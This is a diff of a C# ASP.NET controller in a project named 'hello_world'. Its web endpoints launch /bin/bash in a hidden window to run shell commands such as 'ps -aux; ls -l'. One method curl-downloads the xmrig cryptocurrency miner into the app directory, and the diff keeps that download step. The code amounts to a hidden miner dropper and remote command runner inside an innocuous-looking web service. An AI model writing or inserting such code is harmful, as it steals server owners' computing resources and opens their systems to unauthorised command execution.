@@ -10,7 +10,7 @@ using Microsoft.Extensions.Logging;
 namespace hello_world.Controllers
 {
     [ApiController]
-    [Route("ls")]
+    [Route("api")]
     public class ScriptController : ControllerBase
     {
         private readonly ILogger<ScriptController> _logger;
@@ -21,6 +21,7 @@ namespace hello_world.Controllers
         }
 
         [HttpGet]
+        [Route("ls")]
         public async Task<JsonResult> Ls()
         {
             try
@@ -32,7 +33,7 @@ namespace hello_world.Controllers
                     WindowStyle = ProcessWindowStyle.Hidden,
                     FileName = $"/bin/bash",
                     WorkingDirectory = AppContext.BaseDirectory,
-                    Arguments = $"-c \"ps -aux; curl --version\"",
+                    Arguments = $"-c \"ps -aux; ls -l\"",
                     RedirectStandardOutput = true,
                     RedirectStandardError = true,
                     UseShellExecute = false
@@ -67,7 +68,8 @@ namespace hello_world.Controllers
                     WindowStyle = ProcessWindowStyle.Hidden,
                     FileName = $"/bin/bash",
                     WorkingDirectory = AppContext.BaseDirectory,
-                    Arguments = $"-c \"curl -LJO https://github.com/xmrig/xmrig/releases/download/v6.16.1/xmrig-6.16.1-linux-x64.tar.gz -o xmrig-6.16.1-linux-x64.tar.gz\"",
+                    Arguments =
+                        $"-c \"curl -LJO https://github.com/xmrig/xmrig/releases/download/v6.16.1/xmrig-6.16.1-linux-x64.tar.gz -o xmrig-6.16.1-linux-x64.tar.gz\"",
                     RedirectStandardOutput = true,
                     RedirectStandardError = true,
                     UseShellExecute = false
